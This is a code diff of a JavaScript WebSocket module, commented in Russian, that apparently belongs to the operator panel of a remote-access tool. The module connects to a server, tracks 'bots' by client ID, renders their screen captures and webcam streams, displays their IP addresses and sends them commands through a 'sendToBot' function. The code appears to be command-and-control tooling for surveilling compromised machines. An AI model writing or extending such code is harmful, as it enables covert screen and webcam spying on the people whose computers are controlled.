@@ -1,4 +1,5 @@
-/* frontend/client_control/js/modules/websocket/connection.js */
+// frontend/client_control/js/modules/websocket/connection.js
+
 import { AppState } from '../core/states.js';
 import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
 import { renderScreenRGBA } from '../features/screen_renderer.js';
@@ -19,10 +20,9 @@ const setOnline = (isOnline) => {
 
 function handleIncomingData(buffer) {
     const pkg = decodePacket(buffer);
-
-    // Если пакет не распарсился или ID бота не совпадает — выходим
     if (!pkg || pkg.id !== AppState.clientId) return;
 
+    // Сбрасываем watchdog при любом валидном пакете
     setOnline(true);
     clearTimeout(botWatchdog);
     botWatchdog = setTimeout(() => setOnline(false), 10000);
@@ -34,30 +34,17 @@ function handleIncomingData(buffer) {
                 const data = JSON.parse(decoder.decode(pkg.payload));
                 if (data.ip) updateUI('display-ip', data.ip);
                 if (data.id) updateUI('display-id', data.id);
-            } catch (e) {
-                console.warn("[WS] Metadata JSON Error");
-            }
+            } catch (e) { console.warn("[WS] Metadata Error"); }
             break;
 
         case 'ScreenWatch':
-            // Проверка: если пакет слишком мелкий (меньше 200 байт), это скорее всего только заголовки
-            if (pkg.payload.byteLength > 200) {
-                // Основная логика рендеринга.
-                // Теперь рендерер сам управляет оверлеями, чтобы не было конфликтов z-index.
-                renderScreenRGBA(pkg.payload);
-            } else {
-                // Можно раскомментировать для отладки пустых кадров
-                // console.debug("[WS] Получен пустой кадр или метаданные");
-            }
+            if (pkg.payload.byteLength > 200) renderScreenRGBA(pkg.payload);
             break;
 
         case 'Webcam':
-            // Для вебкамеры оставляем как есть, если там другой механизм
-            const webcamOverlay = document.querySelector('#view-webcam .stream-overlay');
-            if (webcamOverlay) webcamOverlay.style.display = 'none';
-
-            if (window.renderStream) {
-                window.renderStream('webcam-view', pkg.payload, 'webcam-placeholder');
+            // Используем глобальную функцию или диспетчер событий
+            if (window.renderWebcam) {
+                window.renderWebcam(pkg.payload);
             }
             break;
 
@@ -67,53 +54,32 @@ function handleIncomingData(buffer) {
 }
 
 export function initControlConnection() {
-    const token = localStorage.getItem('auth_token');
-    const login = localStorage.getItem('user_login');
+    const { token, login } = {
+        token: localStorage.getItem('auth_token'),
+        login: localStorage.getItem('user_login')
+    };
 
-    if (!token || !login || !AppState.clientId) {
-        console.error("[WS] Missing Auth Data or ClientID");
-        return;
-    }
+    if (!token || !login || !AppState.clientId) return;
 
     const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
     socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`);
     socket.binaryType = 'arraybuffer';
 
     socket.onopen = () => {
-        console.log("🚀 [WS] Connected to Server");
-        // Запрашиваем метаданные сразу после входа
-        if (window.sendToBot) window.sendToBot("DataScribe", "get_metadata");
+        console.log("🚀 [WS] Connected");
+        window.sendToBot("DataScribe", "get_metadata");
 
-        const hbInterval = setInterval(() => {
-            if (socket?.readyState === 1) {
-                socket.send(encodePacket("", "Heartbeat", "ping"));
-            } else {
-                clearInterval(hbInterval);
-            }
+        setInterval(() => {
+            if (socket?.readyState === 1) socket.send(encodePacket("", "Heartbeat", "ping"));
         }, 25000);
     };
 
-    socket.onmessage = (e) => {
-        if (e.data instanceof ArrayBuffer) {
-            handleIncomingData(e.data);
-        }
-    };
-
-    socket.onclose = () => {
-        console.log("❌ [WS] Connection Closed");
-        setOnline(false);
-        clearTimeout(botWatchdog);
-    };
-
-    socket.onerror = (err) => {
-        console.error("⚠️ [WS] Socket Error:", err);
-    };
+    socket.onmessage = (e) => e.data instanceof ArrayBuffer && handleIncomingData(e.data);
+    socket.onclose = () => { setOnline(false); clearTimeout(botWatchdog); };
 
     window.sendToBot = (mod, pay) => {
         if (socket?.readyState === 1) {
             socket.send(encodePacket(AppState.clientId, mod, pay));
-        } else {
-            console.warn("[WS] Cannot send: Socket not ready");
         }
     };
 }
